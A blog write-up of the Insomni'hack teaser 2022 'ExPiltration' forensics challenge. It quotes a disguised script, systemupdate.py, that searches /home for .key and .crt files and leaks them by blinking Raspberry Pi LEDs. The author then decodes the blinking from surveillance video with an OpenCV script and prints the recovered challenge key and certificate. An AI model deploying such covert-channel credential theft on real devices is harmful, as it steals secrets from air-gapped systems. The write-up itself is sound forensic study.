---
title: Insomni'hack teaser 2022 – ExPiltration
date: '2022-01-30'
draft: false
authors: ['blueset']
tags: ["Insomni'hack teaser 2022", 'Misc', 'Python', 'CV', 'Video', 'Binary']
summary: 'Leak data via LED lights.'
---
## ExPiltration
> by Kev1n
>
> Oh shit.. (!) Our network has been compromised and data stored on an air-gaped device stolen but we don't know exactly what has been extracted and how? We have 24/7 video surveillance in the server room and nobody has approched the device.. Here is all I have, could you please give us a hand?
>
> [forensic-data.zip](https://static.insomnihack.ch/media/forensic-data-4e3c106c44132d3fb368ba26675169fe4f10289da7bd637c3b3cc0e570579efa.zip)

Download the zip archive and open it to review a huge file structure.

```
Archive:  forensic-data-4e3c106c44132d3fb368ba26675169fe4f10289da7bd637c3b3cc0e570579efa.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  03-19-2022 15:42   forensic-data/
354284310  03-19-2022 15:42   forensic-data/surveillance-camera42-2022.03.19_part8.mp4
(...omitted 3616 files...)
     1322  03-19-2022 15:42   forensic-data/storage/usr/bin/systemupdate.py
---------                     -------
371628093                     3619 files
```

Content of `forensic-data/storage/usr/bin/systemupdate.py`:

```py
import os
import time
import binascii

DELAY = 0.05

def init_leds():
	os.system("echo none > /sys/class/leds/led0/trigger")
	os.system("echo none > /sys/class/leds/led1/trigger")

def restore_leds():
	os.system("echo mmc0 > /sys/class/leds/led0/trigger")
	os.system("echo default-on > /sys/class/leds/led1/trigger")

def text_to_bits(text, encoding='utf-8', errors='surrogatepass'):
    bits = bin(int(binascii.hexlify(text.encode(encoding, errors)), 16))[2:]
    return bits.zfill(8 * ((len(bits) + 7) // 8))

def exfiltrate(data):
	stream = text_to_bits(data)
	for b in stream:
		if b=='0':
			os.system("echo 0 > /sys/class/leds/led0/brightness")
		else:
			os.system("echo 1 > /sys/class/leds/led0/brightness")

		time.sleep(DELAY)
		os.system("echo 1 > /sys/class/leds/led1/brightness")
		time.sleep(DELAY)
		os.system("echo 0 > /sys/class/leds/led1/brightness")
		time.sleep(DELAY)

def find_scret_file(path):
	files = []
	for r, d, f in os.walk(path):
		for file in f:
			if '.key' in file or '.crt' in file:
				files.append(os.path.join(r, file))

	for f in files:
		print("[+] Secret file discovered ({0}).. starting exfiltration".format(f))
		with open(f, 'r') as h:
			data = h.read()
		exfiltrate(data)

def main():

	init_leds()
	find_scret_file("/home")
	restore_leds()

if __name__ == '__main__':
	main()
```

`forensic-data/surveillance-camera42-2022.03.19_part8.mp4` is an 1-hour video recording a Raspberry Pi with blinking green and red LEDs.

![Screenshot of the video](/static/images/insomnihack-teaser-2022/surveillance-camera42-2022.03.19_part8-0001.png)

Looking at the source code, we can see that the script is encoding files to binary and sending them out through blinking LED lights. What we need to do is to extract the blinking patterns and revert them to the original files.

From online resources about Raspberry Pi, we can know that `led0` is the green LED and `led1` is the red LED.

A Python script can be written to extract the luminance of the LEDs frame-by-frame. The luminance can then be polarized and compared to extract the bits.

```py
import cv2
import tqdm
import bitstring

def rgb_to_luminance(r, g, b):
    return 0.2126 * r + 0.7152 * g + 0.0722 * b

vidcap = cv2.VideoCapture('surveillance-camera42-2022.03.19_part8.mp4')

with tqdm.tqdm(total=vidcap.get(cv2.CAP_PROP_FRAME_COUNT)) as t:
    success, image = vidcap.read()
    t.update(1)
    led0 = []
    led1 = []
    while success:
        led0.append(rgb_to_luminance(*image[550][717]))
        led1.append(rgb_to_luminance(*image[550][735]))
        success, image = vidcap.read()
        t.update(1)

bits_raw = []
start = 0
end = 0
threshold = 210
is_on = True
for i in range(len(led0)):
    if is_on and led1[i] < threshold:
        is_on = False
        end = i
        bits_raw.append(sum(led0[start:end]) / (end - start))
    elif not is_on and led1[i] > threshold:
        is_on = True
        start = i

bits = [0 if i < threshold else 1 for i in bits_raw]

b = bitstring.BitArray(bin="".join(map(str, bits[1:])))
print(b.bytes.decode())
```

Below is a partial visualization of the luminance of the LEDs frame by frame. The part shown below gives bytes `…000 0011 0111 0101 0101 0101 0110 010…`, which is `…7UV…` in ASCII bits.

![Partial visualization of the luminance of the LEDs](/static/images/insomnihack-teaser-2022/visualization-led.png)

A Root Certificate Authority certificate and a private key is found from the extracted data.

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,3DCC451E9205CCE3

nDrRqGRPQ2/ngMd3+93aVspUPtLszfEqmBMdY7FGwDOzjR4qW/TAvGutNj5BNNkM
4P1D4+3wNo0vnNCzgBw+MCS6J5Ipo7SV/Gvcg+Y0vzroOdp3q7Qw6FJP0BdCW2y5
khy6K52JwLjfLnekpBGMA/3fl3pzOgKthQqYllFLrJBeNCo8BFSn/PN80oucpBXv
V+F4aFs57dkoPwCvoB7djmLfpTRCOr0j2PeaqKrUq975nt4Ot+iXy6AURCIt7Z9m
sCxU8bwMHIwUqok/VI39UzGO5xTWp1ffrYR1jaDD6WlGSe2duPeG/zeM60E1R8nP
gZpR1zKpH8QOBuVC433glT5LXqfstPmt7MDwnTawkABvFYIElm4Guegm7NdQSPj/
jAXbZRc5Ww7pt2oFcwzW+uXBYEF2g92rxtUDW0wmgTduNASz59OnYEOr5Ly7NQnh
3V+Vcsrgc4Aowi1z6kCpvHoA4Cg7kZanpNguQ6NeXsCNr94P795ffhuRuXOPnwte
pkEpEplOFLOhJgHST/6ACoiJCc4nYuyKBoH07zJ7WHktryT/655EINwuBx5mVoye
2DykTBypxrcJedPBKxSWmAOOY0QnNMABZsOzgPR9wh/uIEw/zInkdTNN0iYpF8TX
EFY0uBjj7IzDQ10Sb9dcnFRB4AFuqOA7GOhh0U7VxZlhtT6UzSb/O+/smNwOD4IU
qj8LVnaZMVW4MmBbEKzsKOGhOvLHrfLVIBFdn5hTHamwS2H87UVXMLtFFPrFz6JC
zHbOb6I2f7gHzvJJPvB4eSMwAZw/iSpRoyJG7PwIKQsb6/GauV7Rfw==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIDHDCCAoWgAwIBAgIUTIdoG+aad3eIE+iXDUKZCohVKkQwDQYJKoZIhvcNAQEL
BQAwgZ8xCzAJBgNVBAYTAkNIMQ8wDQYDVQQIDAZHZW5ldmExEDAOBgNVBAcMB1Bh
bGV4cG8xFTATBgNVBAoMDEluc29tbmknaGFjazEhMB8GA1UECwwYSU5Te0Y0ckZy
MG0kcDMzZDBmTDFnaHR9MQ4wDAYDVQQDDAVLZXZpbjEjMCEGCSqGSIb3DQEJARYU
a2V2aW5AaW5zb21uaWhhY2suY2gwHhcNMjAwMzAzMTYxOTE1WhcNMjIxMjIyMTYx
OTE1WjCBnzELMAkGA1UEBhMCQ0gxDzANBgNVBAgMBkdlbmV2YTEQMA4GA1UEBwwH
UGFsZXhwbzEVMBMGA1UECgwMSW5zb21uaSdoYWNrMSEwHwYDVQQLDBhJTlN7RjRy
RnIwbSRwMzNkMGZMMWdodH0xDjAMBgNVBAMMBUtldmluMSMwIQYJKoZIhvcNAQkB
FhRrZXZpbkBpbnNvbW5paGFjay5jaDCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkC
gYEAxx9oaesqRe4b0wLER6ppALJYrm5qrWu/uqzgy7qjpDKg5BBSl5F+Y2TgwS09
pW5tBylKr92DES19o4cm/8g1wa0iZ9BDeSvbn8g+rTLGHTgctMW2wUg/SMQ9j/G7
nyr5oMiPkJ69kz1We83RJofCK1w8QZVr7UAwDlC1rR6V1gkCAwEAAaNTMFEwHQYD
VR0OBBYEFA130/zdKufEuzcn+cCVwoO84z7iMB8GA1UdIwQYMBaAFA130/zdKufE
uzcn+cCVwoO84z7iMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADgYEA
k0guKE9tSrNYUyeAEsXba15SV0TGg6n+QCD/Co0XvDo7D2yKEfSMnDfjMkv+39E+
U//PN4LT/R6xl2XdqQV1Rk0tFHTrHRzQps/ispaR3lC3VLkx8/KK05eSvKMr1C80
4jzMs6Qw6bT8Dj83eMfjizl3tlE997DgGpruRaOaEOE=
-----END CERTIFICATE-----
```

Save the certificate part to a file, use OpenSSL to inspect it, and find the flag in the Organization Unit field.

```sh
openssl x509 -in root-ca.crt -text -noout
```
